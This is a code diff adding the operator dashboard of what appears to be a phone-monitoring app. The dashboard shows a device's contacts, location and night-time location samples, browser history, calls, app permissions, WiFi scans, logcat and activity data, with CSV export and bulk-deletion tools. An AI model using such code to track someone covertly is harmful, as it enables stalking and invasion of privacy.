+      num: (c.number || '').replace(/[\s\-\(\)]/g, ''),
+      email: c.email || ''
+    });
+    if (Array.isArray(raw)) {
+      raw.forEach((c, i) => entries.push({ idx: i, ...extract(c) }));
+    } else {
+      Object.entries(raw).forEach(([k, c]) => {
+        if (c && typeof c === 'object') entries.push({ idx: k, ...extract(c) });
+      });
+    }
+    const toDelete = [];
+    for (const e of entries) {
+      const key = e.num || e.email || e.name;
+      if (!key) continue;
+      if (seen.has(key)) {
+        const prev = seen.get(key);
+        if ((e.name !== 'Unknown' && prev.name === 'Unknown') ||
+            (e.name !== 'Unknown' && prev.name === e.name && e.email && !prev.email)) {
+          seen.set(key, e);
+          toDelete.push(prev.idx);
+        } else {
+          toDelete.push(e.idx);
+        }
+      } else {
+        seen.set(key, e);
+      }
+    }
+    if (!toDelete.length) { showAlert('No duplicate contacts found', 'error'); return; }
+    let deleted = 0;
+    for (const idx of toDelete) {
+      if (Array.isArray(raw)) {
+        const fullPath = `${base}/contacts/all/${idx}`;
+        if (await deleteRTDB(`${base}/contacts/all/${idx}`)) deleted++;
+      } else {
+        if (await deleteRTDB(`${base}/contacts/all/${idx}`)) deleted++;
+      }
+    }
+    showAlert(`Deleted ${deleted} duplicate contacts`, deleted > 0 ? 'warn' : 'error');
+    pollContacts();
+    await refreshStorage();
+    return;
+  }
+  if (action === 'deleteAll') {
+    const fullPath = `${base}/${path}`;
+    if (!confirm(`Delete ALL ${path} data?\nThis cannot be undone.`)) return;
+    const ok = await deleteRTDB(fullPath);
+    if (ok) {
+      if (path === 'photos') { cachedPhotos = {}; renderPhotosFromCache(); }
+      showAlert(`Deleted all ${path} data`, 'warn');
+      await refreshStorage();
+    } else {
+      showAlert(`Failed to delete ${path}`, 'error');
+    }
+    return;
+  }
+  if (action === 'dedupLocations') {
+    if (!confirm('Scan and deduplicate location entries?')) return;
+    showAlert('Scanning location entries...', 'warn');
+    let allPoints = [];
+    async function scanLoc(path) {
+      const data = await fetchRTDB(`${base}/location${path}`, 'shallow=true');
+      if (!data || typeof data !== 'object') return;
+      for (const k of Object.keys(data)) {
+        if (['latest','history','night_samples'].includes(k)) continue;
+        allPoints.push({ path: `location${path}/${k}`, key: k });
+      }
+    }
+    // Scan flat nodes
+    const flat = await fetchRTDB(`${base}/location`, 'shallow=true');
+    if (flat && typeof flat === 'object') {
+      for (const k of Object.keys(flat)) {
+        if (['latest','history','night_samples'].includes(k)) continue;
+        allPoints.push({ path: `location/${k}`, key: k });
+      }
+    }
+    // Scan night_samples
+    const ns = await fetchRTDB(`${base}/location/night_samples`, 'shallow=true');
+    if (ns && typeof ns === 'object') {
+      for (const k of Object.keys(ns)) {
+        allPoints.push({ path: `location/night_samples/${k}`, key: k });
+      }
+    }
+    // Scan history tree
+    async function scanHistory(sub) {
+      const d = await fetchRTDB(`${base}/location/history${sub}`, 'shallow=true');
+      if (!d || typeof d !== 'object') return;
+      for (const [k, v] of Object.entries(d)) {
+        if (v === true) await scanHistory(sub + '/' + k);
+        else allPoints.push({ path: `location/history${sub}/${k}`, key: k });
+      }
+    }
+    await scanHistory('');
+    if (!allPoints.length) { showAlert('No location entries found', 'error'); return; }
+    document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning ${allPoints.length} entries...</div>`;
+    const groups = {};
+    let scanned = 0;
+    for (const pt of allPoints) {
+      const doc = await fetchRTDB(`${base}/${pt.path}`);
+      if (doc && doc.lat) {
+        const rawTs = parseInt(doc.ts_ms || doc.timestamp || pt.key) || 0;
+        const sec = Math.floor(rawTs / 1000);
+        const gk = `${doc.lat.toFixed(4)}|${doc.lng.toFixed(4)}|${sec}`;
+        if (!groups[gk]) groups[gk] = [];
+        groups[gk].push({ path: pt.path, key: pt.key });
+      }
+      scanned++;
+      if (scanned % 30 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanned ${scanned}/${allPoints.length}...</div>`;
+    }
+    let deleted = 0;
+    for (const [gk, entries] of Object.entries(groups)) {
+      if (entries.length <= 1) continue;
+      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
+      for (let i = 1; i < entries.length; i++) {
+        if (await deleteRTDB(`${base}/${entries[i].path}`)) deleted++;
+      }
+    }
+    await refreshStorage();
+    showAlert(`Deleted ${deleted} duplicate location entries`, deleted > 0 ? 'warn' : 'error');
+    return;
+  }
+  if (action === 'deleteLocHistory') {
+    if (!confirm('Delete all location history (keeps current location)?\nThis cannot be undone.')) return;
+    let ok1 = true, ok2 = true;
+    const ns = await fetchRTDB(`${base}/location/night_samples`, 'shallow=true');
+    if (ns && typeof ns === 'object') {
+      for (const k of Object.keys(ns)) {
+        if (!(await deleteRTDB(`${base}/location/night_samples/${k}`))) ok1 = false;
+      }
+    }
+    const hist = await fetchRTDB(`${base}/location/history`, 'shallow=true');
+    if (hist && typeof hist === 'object') {
+      ok2 = await deleteRTDB(`${base}/location/history`);
+    }
+    await refreshStorage();
+    if (ok1 && ok2) showAlert('Deleted location history', 'warn');
+    else showAlert('Some location entries could not be deleted', 'error');
+    return;
+  }
+  if (action === 'clearPhotoCache') {
+    if (!confirm('Clear local photo dedup cache?\nThis will re-scan all photos on next sync (may re-upload duplicates).')) return;
+    cachedPhotos = {};
+    photoKeys = [];
+    photoOffset = 0;
+    showAlert('Photo cache cleared — next sync will re-scan all photos', 'warn');
+    await loadPhotos();
+    renderPhotosFromCache();
+    await refreshStorage();
+    return;
+  }
+  if (action === 'clearVoiceBudget') {
+    if (!confirm('Clear the 30-day voice audio budget?\nThis will allow new voice notes with audio to be uploaded again.')) return;
+    const ok = await deleteRTDB(`${base}/voice_audio_batch_sizes`);
+    if (ok) {
+      showAlert('Voice audio budget cleared — new voice notes can now upload with audio', 'warn');
+      await refreshStorage();
+    } else {
+      showAlert('Failed to clear voice budget', 'error');
+    }
+    return;
+  }
+  if (action === 'deleteAllData') {
+    const typed = prompt('Type "DELETE" to confirm wiping ALL data for this device:');
+    if (typed !== 'DELETE') { showAlert('Cancelled', 'error'); return; }
+    const ok = await deleteRTDB(base);
+    if (ok) {
+      showAlert('All device data deleted from RTDB', 'warn');
+      cachedPhotos = {}; renderPhotosFromCache();
+      document.getElementById('storageOverview').innerHTML = '<div class="label">All data deleted</div>';
+      document.getElementById('cleanupActions').innerHTML = '<div class="label">No data to clean</div>';
+    } else {
+      showAlert('Failed to delete data', 'error');
+    }
+    return;
+  }
+}
+
+// --- Browser History ---
+let browserFilter = 'all';
+document.querySelectorAll('#browserChips .chip').forEach(chip => {
+  chip.addEventListener('click', function() {
+    document.querySelectorAll('#browserChips .chip').forEach(c => c.classList.remove('active'));
+    this.classList.add('active');
+    browserFilter = this.dataset.browser;
+    const cached = document.getElementById('browserList').cachedData;
+    if (cached) renderBrowserHistory(cached);
+  });
+});
+document.getElementById('browserSearch').addEventListener('input', function() {
+  const cached = document.getElementById('browserList').cachedData;
+  if (cached) renderBrowserHistory(cached);
+});
+
+function browserIcon(provider) {
+  const p = (provider || '').toLowerCase();
+  if (p.includes('chrome')) return '\u{1F310}';
+  if (p.includes('firefox')) return '\u{1F98A}';
+  if (p.includes('samsung') || p.includes('sbrowser')) return '\u{1F4F1}';
+  if (p.includes('huawei')) return '\u{1F30D}';
+  if (p.includes('opera')) return '\u{25CE}';
+  if (p.includes('brave')) return '\u{1F99A}';
+  if (p.includes('edge') || p.includes('emmex')) return '\u{1F310}';
+  return '\u{1F5B1}';
+}
+
+function browserGroup(p) {
+  const prov = (p || '').toLowerCase();
+  if (prov.includes('chrome')) return 'chrome';
+  if (prov.includes('firefox')) return 'firefox';
+  if (prov.includes('samsung') || prov.includes('sbrowser')) return 'samsung';
+  if (prov.includes('huawei')) return 'huawei';
+  return 'other';
+}
+
+function renderBrowserHistory(entries) {
+  const list = document.getElementById('browserList');
+  list.cachedData = entries;
+  let filtered = entries;
+  if (browserFilter !== 'all') filtered = filtered.filter(e => browserGroup(e.provider) === browserFilter);
+  const q = document.getElementById('browserSearch').value.toLowerCase();
+  if (q) filtered = filtered.filter(e => (e.title || '').toLowerCase().includes(q) || (e.url || '').toLowerCase().includes(q));
+  if (!filtered.length) { list.innerHTML = '<div class="label">No entries' + (q ? ' matching "' + q + '"' : '') + '</div>'; return; }
+  const groups = {};
+  for (const e of filtered) {
+    const day = new Date(e.dateMs).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push(e);
+  }
+  let html = '';
+  for (const [day, entries] of Object.entries(groups)) {
+    html += `<div class="tl-group"><div class="tl-day">${day} <span style="font-weight:400;color:var(--muted)">(${entries.length})</span></div>`;
+    for (const e of entries) {
+      const icon = browserIcon(e.provider);
+      const title = e.title || '(no title)';
+      const url = e.url ? (e.url.length > 80 ? e.url.slice(0, 80) + '...' : e.url) : '';
+      const visits = e.visits > 1 ? ` \u2022 ${e.visits} visits` : '';
+      const time = e.dateMs ? pktShort(e.dateMs) : '';
+      html += `<div class="card" style="padding:8px 12px;margin-bottom:4px">
+        <div class="time">${icon} ${time}${visits}</div>
+        <div style="font-size:14px;font-weight:500">${escHtml(title)}</div>
+        <div style="font-size:12px;color:var(--muted);word-break:break-all">${escHtml(url)}</div>
+      </div>`;
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html;
+}
+
+async function pollBrowserHistory() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('browserList');
+  list.innerHTML = '<div class="label" style="color:var(--accent)">Loading browsing history...</div>';
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/browser_history`);
+    if (!data || typeof data !== 'object') { list.innerHTML = '<div class="label">No browsing history yet</div>'; return; }
+    const all = [];
+    for (const batch of Object.values(data)) {
+      if (batch && batch.history && Array.isArray(batch.history)) {
+        for (const entry of batch.history) {
+          if (entry && entry.url) all.push(entry);
+        }
+      }
+    }
+    all.sort((a, b) => (b.dateMs || 0) - (a.dateMs || 0));
+    if (!all.length) { list.innerHTML = '<div class="label">No browsing history yet</div>'; return; }
+    renderBrowserHistory(all);
+  } catch { list.innerHTML = '<div class="label" style="color:var(--danger)">Failed to load history</div>'; }
+}
+
+// --- Data Export ---
+async function exportData() {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  const type = prompt('Export type: location / timeline / calls / all', 'all');
+  if (!type) return;
+  let csv = '';
+  if (type === 'location' || type === 'all') {
+    const hist = await fetchRTDB(`devices/${selectedDevice}/location/history`, 'shallow=true');
+    if (hist && typeof hist === 'object') {
+      csv += '--- Location History ---\nts_ms,lat,lng,accuracy,speed\n';
+      const keys = Object.keys(hist).sort();
+      for (const k of keys.slice(-500)) {
+        if (k.includes('/')) continue;
+        const d = await fetchRTDB(`devices/${selectedDevice}/location/history/${k}`);
+        if (d) csv += `${k},${d.lat},${d.lng},${d.accuracy||''},${d.speed||''}\n`;
+      }
+    }
+  }
+  if (type === 'timeline' || type === 'calls' || type === 'all') {
+    const tl = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+    if (tl && typeof tl === 'object') {
+      if (type === 'all') csv += '\n--- Timeline ---\nts_ms,type,number,duration\n';
+      else csv += 'ts_ms,type,number,duration\n';
+      Object.entries(tl).forEach(([k, v]) => {
+        csv += `${k},${v.type||''},${v.number||v.contactName||''},${v.duration||0}\n`;
+      });
+    }
+  }
+  if (!csv) { showAlert('No data to export', 'warn'); return; }
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = `kojos_${selectedDevice}_${new Date().toISOString().slice(0,10)}.csv`;
+  a.click(); URL.revokeObjectURL(url);
+  showAlert('Exported ' + (csv.match(/\n/g)||[]).length + ' rows', 'warn');
+}
+
+// --- App Permissions ---
+function fmtPerm(name) {
+  return name.split('.').pop().replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+}
+function fmtPermission(name) {
+  let s = name;
+  // Strip common prefixes
+  for (const p of ['android.permission.', 'com.android.', 'com.google.android.', 'com.huawei.']) {
+    if (s.startsWith(p)) { s = s.slice(p.length); break; }
+  }
+  // Strip trailing .permission. or .
+  if (s.startsWith('permission.')) s = s.slice(11);
+  return s.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+}
+
+function renderPermissions() {
+  const list = document.getElementById('permList');
+  const syncInfo = document.getElementById('permSyncInfo');
+  if (!window.permCache || !window.permCache.length) {
+    list.innerHTML = '<div class="label">No permissions data yet</div>';
+    if (syncInfo) syncInfo.textContent = '';
+    return;
+  }
+  const query = (document.getElementById('permSearch')?.value || '').toLowerCase();
+  let totalGranted = 0, totalDenied = 0, totalPerms = 0;
+  for (const app of window.permCache) {
+    for (const p of app.permissions) {
+      totalPerms++;
+      if (p.granted) totalGranted++; else totalDenied++;
+    }
+  }
+  const ratio = totalPerms > 0 ? (totalGranted / totalPerms * 100).toFixed(0) : 0;
+  if (syncInfo) {
+    syncInfo.textContent = '\u{1F512} ' + window.permCache.length + ' apps \u2022 ' + totalPerms + ' perms \u2022 Last sync: ' + (window.permLastSync ? pktShort(window.permLastSync) : '--');
+  }
+  let html = '';
+  // Summary bar
+  html += '<div style="margin-bottom:8px;background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)">' +
+    '<div style="height:20px;display:flex">' +
+    '<div style="background:var(--success);width:' + ratio + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#000;min-width:fit-content;padding:0 6px">\u2713 ' + totalGranted + ' Granted</div>' +
+    '<div style="background:var(--danger);width:' + (100 - ratio) + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#fff;min-width:fit-content;padding:0 6px">\u2717 ' + totalDenied + ' Denied</div>' +
+    '</div></div>';
+  // Denied apps section
+  const deniedApps = window.permCache.filter(a => a.permissions.some(p => !p.granted) && (!query || a.appName.toLowerCase().includes(query) || a.packageName.toLowerCase().includes(query) || a.permissions.some(p => p.name.toLowerCase().includes(query))));
+  const grantedApps = window.permCache.filter(a => a.permissions.every(p => p.granted) && (!query || a.appName.toLowerCase().includes(query) || a.packageName.toLowerCase().includes(query)));
+  if (deniedApps.length) {
+    html += '<div style="font-size:13px;color:var(--danger);font-weight:600;padding:4px 0;margin-bottom:4px">\u26A0 ' + deniedApps.length + ' app' + (deniedApps.length > 1 ? 's' : '') + ' with denied permissions</div>';
+    for (const app of deniedApps) {
+      const granted = app.permissions.filter(p => p.granted);
+      const denied = app.permissions.filter(p => !p.granted);
+      html += '<div class="card" style="border-left-color:var(--danger);padding:8px 12px;margin-bottom:4px">' +
+        '<div style="display:flex;justify-content:space-between;align-items:center;font-size:14px;font-weight:500">' +
+        '<span style="color:var(--danger)">\u2717 ' + app.appName + '</span>' +
+        '<span style="font-size:12px"><span style="color:var(--success)">\u2713 ' + granted.length + '</span> <span style="color:var(--danger)">\u2717 ' + denied.length + '</span></span>' +
+        '</div>' +
+        '<div style="font-size:11px;color:var(--muted);margin:2px 0 4px">' + app.packageName + '</div>';
+      if (denied.length) {
+        html += '<div style="padding:4px 6px;background:rgba(248,81,73,0.08);border-radius:4px;margin-bottom:4px">';
+        for (const p of denied) {
+          html += '<div style="font-size:12px;color:var(--danger);padding:1px 0"><span style="opacity:0.6">\u2717</span> ' + fmtPermission(p.name) + '</div>';
+        }
+        html += '</div>';
+      }
+      if (granted.length) {
+        html += '<details style="font-size:12px"><summary style="color:var(--muted);cursor:pointer;font-size:11px">\u2713 ' + granted.length + ' granted perms \u25BC</summary><div style="padding:4px 6px;margin-top:2px;background:rgba(63,185,80,0.06);border-radius:4px">';
+        for (const p of granted) {
+          html += '<div style="font-size:12px;color:var(--success);padding:1px 0"><span style="opacity:0.6">\u2713</span> ' + fmtPermission(p.name) + '</div>';
+        }
+        html += '</div></details>';
+      }
+      html += '</div>';
+    }
+  }
+  // Fully granted apps section
+  if (grantedApps.length) {
+    html += '<div style="font-size:13px;color:var(--success);font-weight:600;padding:6px 0 4px">\u2713 ' + grantedApps.length + ' app' + (grantedApps.length > 1 ? 's' : '') + ' fully granted</div>';
+    html += '<div style="display:flex;flex-wrap:wrap;gap:3px">';
+    for (const app of grantedApps) {
+      html += '<span style="font-size:12px;padding:3px 8px;border-radius:4px;background:rgba(63,185,80,0.1);color:var(--success)">\u2713 ' + app.appName + '</span>';
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html || '<div class="label">No apps match your search</div>';
+}
+
+async function pollPermissions() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/permissions`);
+  if (!data || typeof data !== 'object') {
+    window.permCache = null;
+    window.permLastSync = 0;
+    document.getElementById('permList').innerHTML = '<div class="label">No permissions data yet</div>';
+    return;
+  }
+  window.permCache = Object.values(data).map(v => ({
+    appName: v.appName || v.packageName || '?',
+    packageName: v.packageName || '',
+    permissions: (v.permissions || []).map(p => ({
+      name: p.name || '',
+      granted: p.granted === true
+    }))
+  })).sort((a, b) => {
+    const aDenied = a.permissions.filter(p => !p.granted).length;
+    const bDenied = b.permissions.filter(p => !p.granted).length;
+    return bDenied - aDenied || a.appName.localeCompare(b.appName);
+  });
+  window.permLastSync = Date.now();
+  renderPermissions();
+}
+
+document.getElementById('permSearch')?.addEventListener('input', renderPermissions);
+
+// --- WiFi ---
+let wifiCache = [];
+
+async function pollWifiScans() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
+  if (!data || typeof data !== 'object') {
+    wifiCache = [];
+    document.getElementById('wifiList').innerHTML = '<div class="label">No WiFi scan data yet</div>';
+    return;
+  }
+  wifiCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      networks: (val.networks || []).map(n => ({
+        ssid: n.ssid || '',
+        bssid: n.bssid || '',
+        rssi: n.rssi != null ? parseInt(n.rssi) : -100,
+        frequency: n.frequency || 0,
+        capabilities: n.capabilities || ''
+      }))
+    }))
+    .filter(s => s.ts && s.networks.length)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  // Show visible AP count on live tab
+  if (wifiCache.length) {
+    const latestAps = wifiCache[0].networks.length;
+    const apCountEl = document.getElementById('wifiApCount');
+    if (apCountEl) apCountEl.textContent = '📡 ' + latestAps;
+  }
+  renderWifiScans();
+}
+
+// --- Logcat ---
+let logcatCache = [];
+
+async function pollLogcat() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/logcat`);
+  if (!data || typeof data !== 'object') {
+    logcatCache = [];
+    return;
+  }
+  logcatCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      logcat: val.logcat || '',
+      lines: val.lines || 0
+    }))
+    .filter(s => s.ts && s.logcat)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  renderLogcat();
+}
+
+function renderLogcat() {
+  const list = document.getElementById('logcatContent');
+  const filter = document.getElementById('logcatFilter').value;
+  const query = (document.getElementById('logcatSearch').value || '').toLowerCase();
+  if (!logcatCache.length) {
+    list.innerHTML = '<div class="label">No logcat data yet</div>';
+    return;
+  }
+  let html = '';
+  for (const entry of logcatCache) {
+    let lines = entry.logcat.split('\n');
+    // Filter by log level
+    if (filter) {
+      const prefix = ' ' + filter + '/';
+      lines = lines.filter(l => l.includes(prefix));
+    }
+    if (query) {
+      lines = lines.filter(l => l.toLowerCase().includes(query));
+    }
+    lines = lines.slice(0, 200);
+    if (!lines.length && (filter || query)) continue;
+    html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+      <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+        <span style="font-size:14px;color:var(--muted)">${pkt(entry.ts)}</span>
+        <span style="font-size:13px;color:var(--muted)">${lines.length}/${entry.lines} lines</span>
+      </div>
+      <pre style="font-family:monospace;font-size:12px;color:var(--text);white-space:pre-wrap;overflow-x:auto;max-height:300px">${escHtml(lines.join('\n'))}</pre>
+    </div>`;
+  }
+  list.innerHTML = html || '<div class="label">No logcat matches your search</div>';
+}
+
+function clearLogcat() {
+  logcatCache = [];
+  document.getElementById('logcatContent').innerHTML = '<div class="label" style="color:var(--muted)">Logcat cleared</div>';
+}
+
+document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
+document.getElementById('logcatSearch')?.addEventListener('input', renderLogcat);
+
+function renderWifiScans() {
+  const list = document.getElementById('wifiList');
+  const query = (document.getElementById('wifiSearch').value || '').toLowerCase();
+  if (!wifiCache.length) {
+    list.innerHTML = '<div class="label">No WiFi scan data yet</div>';
+    return;
+  }
+  let html = '';
+  for (let i = 0; i < wifiCache.length; i++) {
+    const scan = wifiCache[i];
+    let aps = scan.networks;
+    if (query) {
+      aps = aps.filter(n => n.ssid.toLowerCase().includes(query) || n.bssid.toLowerCase().includes(query));
+    }
+    if (!aps.length && query) continue;
+    aps.sort((a, b) => b.rssi - a.rssi);
+    const isLatest = i === 0;
+    const signalBars = (rssi) => {
+      if (rssi > -50) return 4;
+      if (rssi > -65) return 3;
+      if (rssi > -80) return 2;
+      return 1;
+    };
+    const barColor = (rssi) => rssi > -50 ? 'var(--success)' : rssi > -65 ? 'var(--accent)' : 'var(--danger)';
+    const band = (freq) => freq >= 5000 ? '5G' : freq >= 2400 ? '2.4' : '?';
+    const apRows = aps.slice(0, 30).map(n => {
+      const bars = signalBars(n.rssi);
+      const color = barColor(n.rssi);
+      const barHtml = '<span class="wifi-signal">' +
+        [1,2,3,4].map(j => `<span class="bar ${j <= bars ? 'on' : ''}" style="height:${4+j*2}px;background:${j <= bars ? color : 'var(--border)'}"></span>`).join('') +
+        '</span>';
+      return `<div class="wifi-ap-row">
+        ${barHtml}
+        <span class="wifi-ssid">${escHtml(n.ssid || '—')}</span>
+        <span class="wifi-bssid">${n.bssid || '—'}</span>
+        <span class="wifi-rssi">${n.rssi}dBm</span>
+        <span class="wifi-band">${band(n.frequency)}</span>
+        <span class="wifi-cap">${escHtml(n.capabilities || '')}</span>
+      </div>`;
+    }).join('');
+
+    if (isLatest) {
+      html += `<div class="card wifi-latest" style="padding:12px;margin-bottom:8px">
+        <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+          <span style="font-size:15px;font-weight:600;color:var(--success)">&#x1F4E1; Latest Scan</span>
+          <span style="font-size:14px;color:var(--muted)">📡 ${aps.length} access points</span>
+        </div>
+        <div style="font-size:13px;color:var(--muted);margin-bottom:6px">🕐 ${pkt(scan.ts)}</div>
+        ${apRows}
+      </div>`;
+    } else {
+      const prevId = 'wifi-prev-' + i;
+      html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+        <div class="wifi-prev-header" onclick="toggleWifiPrev('${prevId}')">
+          <span>🕐 ${pkt(scan.ts)}</span>
+          <span style="font-size:13px;color:var(--muted)">📡 ${aps.length} APs</span>
+          <span style="font-size:12px;color:var(--muted);margin-left:auto">&#x25BC;</span>
+        </div>
+        <div id="${prevId}" class="wifi-prev-body closed">${apRows}</div>
+      </div>`;
+    }
+  }
+  list.innerHTML = html || '<div class="label">No WiFi scans match your search</div>';
+}
+
+function toggleWifiPrev(id) {
+  const el = document.getElementById(id);
+  if (el) el.classList.toggle('closed');
+}
+
+document.getElementById('wifiSearch')?.addEventListener('input', renderWifiScans);
+
+// --- Health Tab ---
+let healthStepCache = [];
+
+async function pollHealth() {
+  if (!selectedDevice) return;
+  const metrics = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+  const activity = await fetchRTDB(`devices/${selectedDevice}/activity/latest`);
+  const stepsData = await fetchRTDB(`devices/${selectedDevice}/steps`);
+
+  // Steps card
+  const steps = (metrics && metrics.stepsToday) || 0;
+  const goal = (metrics && metrics.stepsGoal) || 8000;
+  const pct = Math.min(100, Math.round((steps / goal) * 100));
+  document.getElementById('healthSteps').textContent = steps.toLocaleString();
+  document.getElementById('healthStepsGoal').textContent = `Goal: ${goal.toLocaleString()} (${pct}%)`;
+  document.getElementById('healthStepsBar').style.width = pct + '%';
+
+  // Activity card
+  if (activity && activity.type) {
+    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
+    const icon = iconMap[activity.type] || '❓';
+    document.getElementById('healthActivity').textContent = `${icon} ${activity.type}`;
+    document.getElementById('healthActivityConfidence').textContent = `Confidence: ${activity.confidence}% | Source: ${activity.source} | ${pkt(activity.ts_ms)}`;
+  } else {
+    document.getElementById('healthActivity').textContent = '--';
+    document.getElementById('healthActivityConfidence').textContent = 'No activity data yet';
+  }
+
+  // Step history chart
+  if (stepsData && typeof stepsData === 'object') {
+    healthStepCache = Object.entries(stepsData)
+      .map(([date, val]) => ({ date, steps: val.steps || 0, ts: val.ts_ms || 0 }))
+      .filter(s => s.date && s.date.length === 10)
+      .sort((a, b) => a.date.localeCompare(b.date))
+      .slice(-7);
+    renderStepChart();
+  } else {
+    document.getElementById('healthStepChart').innerHTML = '<div class="label" style="width:100%;text-align:center;color:var(--muted)">No step history yet</div>';
+  }
+
+  // Activity timeline
+  if (activity && activity.type) {
+    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
+    const icon = iconMap[activity.type] || '❓';
+    document.getElementById('healthActivityTimeline').innerHTML = `
+      <div class="card" style="padding:8px 12px;margin-bottom:4px">
+        <div style="display:flex;justify-content:space-between;font-size:14px">
+          <span>${icon} ${activity.type}</span>
+          <span style="color:var(--muted)">${activity.confidence}% &middot; ${pkt(activity.ts_ms)}</span>
+        </div>
+      </div>`;
+  }
+}
+
+function renderStepChart() {
+  const el = document.getElementById('healthStepChart');
+  if (!healthStepCache.length) {
+    el.innerHTML = '<div class="label" style="width:100%;text-align:center;color:var(--muted)">No step history yet</div>';
+    return;
+  }
+  const max = Math.max(...healthStepCache.map(s => s.steps), 1);
+  const goal = parseInt(document.getElementById('healthStepsGoal').textContent.replace(/[^0-9]/g, '')) || 8000;
+  const barMax = Math.max(max, goal);
+  let html = '';
+  for (const entry of healthStepCache) {
+    const h = Math.max(3, (entry.steps / barMax) * 100);
+    const dayLabel = entry.date.slice(5);
+    html += `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:4px">
+      <div style="font-size:11px;color:var(--muted)">${entry.steps.toLocaleString()}</div>
+      <div style="width:100%;display:flex;justify-content:center;align-items:flex-end;height:80px">
+        <div style="width:70%;height:${h}px;background:${entry.steps >= goal ? 'var(--success)' : 'var(--accent)'};border-radius:4px 4px 0 0;transition:height 0.3s;min-height:3px"></div>
+      </div>
+      <div style="font-size:11px;color:var(--muted)">${dayLabel}</div>
+    </div>`;
+  }
+  el.innerHTML = html;
+}
+
+// --- Init ---
+async function init() {
+  if (typeof Notification !== 'undefined' && Notification.permission === 'default') {
+    try { await Notification.requestPermission(); } catch {}
+  }
+  // Retry fetchDevices up to 3 times with delay
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try { await fetchDevices(); if (selectedDevice) break; } catch {}
+    if (!selectedDevice) await new Promise(r => setTimeout(r, 2000));
+  }
+  if (selectedDevice) try { await pollAll(); } catch {}
+  startPolling();
+  if (geofences.length === 0) {
+    showAlert('Right-click on map to add geofences', 'warn');
+  }
+  setTimeout(refreshStorage, 5000);
+}
+
+init();
+</script>
+</body>
+</html>
